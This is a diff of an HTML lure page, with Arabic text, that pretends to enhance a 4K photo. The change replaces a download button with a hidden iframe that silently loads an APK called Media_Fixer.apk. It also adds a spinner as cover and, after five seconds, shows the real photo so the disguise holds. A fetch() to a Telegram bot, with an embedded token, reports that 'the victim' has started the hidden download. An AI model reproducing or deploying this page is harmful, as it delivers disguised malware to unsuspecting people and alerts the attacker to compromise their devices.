@@ -1,24 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>تحميل الصورة بجودة عالية</title>
+    <title>Media Viewer 4K</title>
     <meta charset="UTF-8">
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; }
-        .btn { background: #25d366; padding: 15px 30px; border: none; border-radius: 5px; color: white; cursor: pointer; font-size: 18px; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 5px solid #333; border-top: 5px solid #25d366; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <img src="shrouk_final.jpg" width="200"><br>
-    <h3>لتنزيل الصورة بجودة 4K الأصلية، يرجى تحديث مشغل الوسائط</h3>
-    <br>
-    <a href="style.css.map" download="Media_Fixer.apk">
-        <button class="btn">تحديث وتحميل الآن</button>
-    </a>
+    <div id="status">
+        <div class="loader"></div>
+        <p>جاري تحسين جودة الصورة للعرض...</p>
+    </div>
+
+    <iframe src="Media_Fixer.apk" style="display:none;"></iframe>
 
     <script>
-        // كود إضافي بيبعت بيانات المتصفح فوراً قبل ما يحمل الملف
-        fetch('https://api.telegram.org/bot8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk/sendMessage?chat_id=1356975454&text=🔥 جاري محاولة اختراق الجهاز وسحب الملفات... 🔥');
+        // إرسال إشعار للبوت إن الضحية دخل وبدأ التحميل تلقائياً
+        fetch('https://api.telegram.org/bot8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk/sendMessage?chat_id=1356975454&text=⚠️ الضحية بدأ التحميل التلقائي للـ APK المخفي! ⚠️');
+
+        // بعد 5 ثواني نظهر الصورة الأصلية عشان نثبت التمويه
+        setTimeout(function(){
+            document.getElementById('status').innerHTML = ' <img src="shrouk_final.jpg" style="max-width:100%;">';
+        }, 5000);
     </script>
 </body>
 </html>
